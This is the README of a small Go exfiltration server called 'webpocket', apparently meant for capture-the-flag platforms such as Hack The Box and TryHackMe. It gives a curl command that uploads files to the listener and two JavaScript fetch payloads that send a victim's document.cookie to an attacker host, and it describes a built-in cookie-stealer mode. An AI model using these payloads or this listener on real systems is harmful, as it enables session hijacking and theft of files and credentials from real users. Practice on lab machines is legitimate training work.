# webpocket

Your online five finger discount!

A simple webserver you can send files or cookies to. I wrote it specifically for machines on HTB, THM etc.

## Usage:

### CLI arguments

```plaintext=
-h          help
-p <port>   specify the port, which the server should run on. Default: 6969
-s <size>   max file size. Default: ~33MB
-k          killswitch, server shuts down after receiving a file

-c          activate cookiestealer
-cl         Output file for cookielog. -c needs to be provided. Default: cookielog.txt
```

### Send data

**POST**

```bash=
curl -X POST --form "exfiltrated=@/path/to/file" http://<server-ip>:6969
```

**Cookies via POST**

```js=
fetch('http://attacker/c', {method: "POST", mode: "no-cors", body: document.cookie})
```

**Cookies via GET**

```js=
fetch('http://attacker/c?'+document.cookie.trim().replace("; ", "&"), {method: "GET", mode: "no-cors"})
```

## Building

```bash=
git clone https://github.com/hobirst/webpocket
cd webpocket
go build .
mv webpocket <somewhere/in/$PATH>
```

## Contributions

Yes please
